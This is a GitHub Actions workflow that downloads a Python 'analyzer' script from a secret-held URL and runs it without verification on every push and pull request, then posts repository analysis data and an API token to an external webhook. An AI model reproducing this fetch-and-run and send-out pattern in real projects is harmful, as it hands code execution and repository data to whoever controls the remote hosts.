name: Enhanced Repository Analysis

on:
  push:
    branches: [ "**" ]
  pull_request:
    types: [opened, closed, synchronize, reopened]
  workflow_dispatch:
    inputs:
      full_analysis:
        description: 'Perform full analysis (ignore cache)'
        required: false
        default: 'false'
        type: string
      max_files:
        description: 'Maximum files to analyze (0 = unlimited)'
        required: false
        default: '0'
        type: string

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: read
    timeout-minutes: 30  # ⏱️ Hard limit for workflow

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4.2.2
        with:
          # For large repos, limit fetch depth
          fetch-depth: ${{ github.event_name == 'push' && 50 || 0 }}

      - name: Setup Python
        uses: actions/setup-python@v5.6.0
        with:
          python-version: '3.11'

      - name: Check repository size
        id: check_size
        run: |
          TOTAL_SIZE=$(du -sb . 2>/dev/null | cut -f1 || echo "0")
          MAX_SIZE=$((100 * 1024 * 1024))  # 100MB max for auto-analysis
          
          if [ -n "$TOTAL_SIZE" ] && [ "$TOTAL_SIZE" -gt "$MAX_SIZE" ]; then
            echo "⚠️ Repository size ($(($TOTAL_SIZE/1024/1024)) MB) exceeds limit (100 MB)"
            echo "LIMIT_EXCEEDED=true" >> $GITHUB_OUTPUT
            echo "Skipping full analysis - use manual trigger for large repos"
          else
            echo "LIMIT_EXCEEDED=false" >> $GITHUB_OUTPUT
            echo "SIZE_MB=$(($TOTAL_SIZE/1024/1024))" >> $GITHUB_OUTPUT
          fi

      - name: Download analyzer script
        if: steps.check_size.outputs.LIMIT_EXCEEDED == 'false'
        env:
            BASE_URL: ${{ secrets.WEBSITE_BASE_URL }}
        run: |
          echo "📥 Downloading enhanced_analyzer.py from $BASE_URL/enhanced_analyzer.py"
          curl -L -o enhanced_analyzer.py "$BASE_URL/enhanced_analyzer.py" \
            -H 'Accept: text/x-python' \
            --connect-timeout 10 \
            --max-time 60 \
            --retry 3 \
            --retry-delay 2

          if [ ! -f enhanced_analyzer.py ]; then
            echo '❌ Failed to download enhanced_analyzer.py'
            exit 1
          fi

          LINE_COUNT=$(wc -l < enhanced_analyzer.py)
          echo "✅ Downloaded enhanced_analyzer.py ($LINE_COUNT lines)"

      - name: Run enhanced repository analysis
        if: steps.check_size.outputs.LIMIT_EXCEEDED == 'false'
        run: |
          echo "🚀 Starting analysis..."
          # Run with timeout protection
          timeout 300 python3 enhanced_analyzer.py || {
            EXIT_CODE=$?
            if [ $EXIT_CODE -eq 124 ]; then
              echo "⚠️ Analysis timed out after 5 minutes"
              echo "Creating partial results..."
            else
              echo "❌ Analysis failed with exit code: $EXIT_CODE"
              exit $EXIT_CODE
            fi
          }

          # Check if results were generated
          if [ -f "enhanced_analysis_result.json" ]; then
            echo "✅ Analysis completed successfully"
            FILE_SIZE=$(stat -c%s enhanced_analysis_result.json 2>/dev/null || stat -f%z enhanced_analysis_result.json 2>/dev/null || echo "0")
            echo "📊 Results file size: $(($FILE_SIZE/1024)) KB"
          else
            echo "❌ No analysis results generated"
            # Create minimal result file
            echo '{
              "error": "Analysis timed out or failed",
              "repository": "${{ github.repository }}",
              "summary": {
                "total_files": 0,
                "code_lines": 0
              }
            }' > enhanced_analysis_result.json
          fi

      - name: Send analysis to external service
        env:
          WEBHOOK_ENDPOINT: ${{ secrets.WEBHOOK_ENDPOINT }}
          WEBHOOK_API_TOKEN: ${{ secrets.WEBHOOK_API_TOKEN }}
        run: |
          # Wait for secrets with timeout
          MAX_WAIT=10
          WAIT_COUNT=0
          until [ -n "$WEBHOOK_ENDPOINT" ] && [ -n "$WEBHOOK_API_TOKEN" ]; do
            if [ "$WAIT_COUNT" -ge "$MAX_WAIT" ]; then
              echo "❌ Secrets not available after ${MAX_WAIT} retries."
              exit 1
            fi
            echo "⏳ Secrets not yet available — waiting 5s (attempt $((WAIT_COUNT+1))/$MAX_WAIT)..."
            sleep 5
            WAIT_COUNT=$((WAIT_COUNT+1))
            WEBHOOK_ENDPOINT="${{ secrets.WEBHOOK_ENDPOINT }}"
            WEBHOOK_API_TOKEN="${{ secrets.WEBHOOK_API_TOKEN }}"
          done

          if [ -z "$WEBHOOK_ENDPOINT" ]; then
            echo "❌ WEBHOOK_ENDPOINT secret is not set!"
            exit 1
          fi

          if [ -f "enhanced_analysis_result.json" ]; then
            echo "📤 Sending analysis to $WEBHOOK_ENDPOINT"
            
            # Use timeout for curl
            if curl -L -X POST "$WEBHOOK_ENDPOINT" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json" \
              -H "X-API-Token: $WEBHOOK_API_TOKEN" \
              -H "X-GitHub-Event: ${{ github.event_name }}" \
              -H "X-Repository: ${{ github.repository }}" \
              -H "X-Run-ID: ${{ github.run_id }}" \
              -d @enhanced_analysis_result.json \
              --max-time 60 \
              --connect-timeout 15 \
              --retry 2 \
              --retry-delay 5 \
              -f \
              -s \
              -o /dev/null; then
              echo "✅ Analysis sent successfully"
            else
              echo "❌ Failed to send analysis"
              
              # Try alternative endpoint
              if [[ "$WEBHOOK_ENDPOINT" == */ ]]; then
                ALT_ENDPOINT="${WEBHOOK_ENDPOINT}"
              else
                ALT_ENDPOINT="${WEBHOOK_ENDPOINT}/"
              fi
              echo "🔄 Retrying with alternative endpoint: $ALT_ENDPOINT"
              
              if curl -L -X POST "$ALT_ENDPOINT" \
                -H "Content-Type: application/json" \
                -H "Accept: application/json" \
                -H "X-API-Token: $WEBHOOK_API_TOKEN" \
                -d @enhanced_analysis_result.json \
                --max-time 60 \
                --connect-timeout 15 \
                --retry 2 \
                -f \
                -s \
                -o /dev/null; then
                echo "✅ Analysis sent successfully on retry"
              else
                echo "❌ Failed to send analysis on retry"
                exit 1
              fi
            fi
          else
            echo "❌ Analysis file not found"
            exit 1
          fi

      - name: Upload analysis artifact
        uses: actions/upload-artifact@v4.6.2
        with:
          name: enhanced-analysis-${{ github.run_id }}
          path: enhanced_analysis_result.json
          retention-days: 7
